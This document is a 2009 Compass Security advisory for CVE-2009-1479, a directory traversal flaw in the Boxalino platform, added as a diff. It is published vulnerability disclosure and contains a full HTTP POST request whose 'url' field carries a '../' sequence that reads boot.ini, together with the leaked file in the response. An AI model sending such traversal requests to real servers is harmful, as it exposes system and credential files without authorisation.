@@ -1,0 +1,93 @@
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# http://www.csnc.ch/en/downloads/advisories.html
+#
+#############################################################
+#
+# Product:  Boxalino
+# Vendor:   Boxalino AG (www.boxalino.com)
+# CVD ID:   CVE-2009-1479
+# Subject:  Directory Traversal Vulnerabilities
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Axel Neumann <axel.neumann@csnc.ch>
+# Date:     2009-10-20
+#
+#############################################################
+
+Introduction
+------------
+An Directory Traversal vulnerability exists in the collaboration
+platform Boxalino [1]. Remote exploitation of a directory traversal
+vulnerability in Boxalino's product allows attackers to read arbitrary
+files on the server file system with web server privileges.
+
+
+Affected
+--------
+Vulnerable:
+ * Boxalino (closed-source product)
+
+Not vulnerable:
+ * Unknown
+
+Not tested:
+ * N/A
+
+
+Technical Description
+---------------------
+When handling HTTP requests, Boxalino does not properly check for
+directory traversal specifiers. Therefore, by including a sequence such
+as "../../../", an attacker is able to read files outside of the
+intended location. The vulnerability exists for both, Windows and UNIX
+based systems.
+
+POST /boxalino/client/desktop/default.htm HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: curl/7.15.5 (i686-redhat-linux-gnu) libcurl/7.15.5
+OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5
+Host: www.example.ch
+Content-Length: 256
+Cookie: JSESSIONID=A57AABD5F2051C4333F500EBB1232295
+Connection: Close
+Pragma: no-cache
+
+url=../../../../../../../../boot.ini&login_loginName=example&login_loginPassword=example&login_cmd_logon=Login&defaultAction=Example&login_cmd_logon_resultPage=%2Fboxalino%2Fclient%2Fdesktop%2Fdefault%2Ehtm
+
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Expires: Tues, 01 Jan 1980 00:00:00 GMT
+Content-Type: text/html
+Content-Length: 208
+Date: Wed, 29 Apr 2009 09:01:06 GMT
+Connection: close
+
+
+[boot loader] timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Windows Server 2003,
+Standard" /noexecute=optout /fastdetect
+
+
+Workaround / Fix
+----------------
+Update to Boxalino Version 09.05.25-0421
+
+
+Timeline
+--------
+2009-10-20:	Advisory Release
+2009-05-26:     Release of fixed Boxalino Version / Patch
+2009-05-25:     Initial vendor response
+2009-04-30:     Initial vendor notification
+2009-04-29:     Assigned CVE-2009-1479
+2009-04-29:     Discovery by Axel Neumann
+
+
+References
+----------
+[1] http://www.boxalino.com/
